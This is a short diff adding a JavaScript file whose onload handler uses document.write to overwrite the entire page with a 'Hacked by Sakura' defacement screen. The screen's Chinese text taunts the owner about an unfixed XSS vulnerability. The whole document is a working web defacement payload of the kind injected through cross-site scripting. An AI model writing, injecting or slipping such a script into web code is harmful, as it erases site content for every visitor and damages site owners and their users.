@@ -1,0 +1,3 @@
+window.onload=function(){
+	document.write("<html> 	<head> 		<title>Hacked by Sakura</title> 		<style> 			body { 				background: #000; 				color: #FFF; 				font-family: Menlo,Monaco,Consolas,'Courier New',monospace; 			} 			center { 				margin-top: 128px; 			} 			p { 				font-size: 22px; 			} 		</style> 	</head> 	<body> 		<center> 			<h1>Oops! 你的网站出了问题</h1> 			<p>被发现了有XSS漏洞噢</p> 			<p>不准备修复一下嘛~</p> 			<p>哎~尽快修复吧，等会被别人玩坏了呢~</p> 			<p>好了，神仙路过不留名</p> 			<p>溜了</p> 		</center> 	</body> </html>");
+}
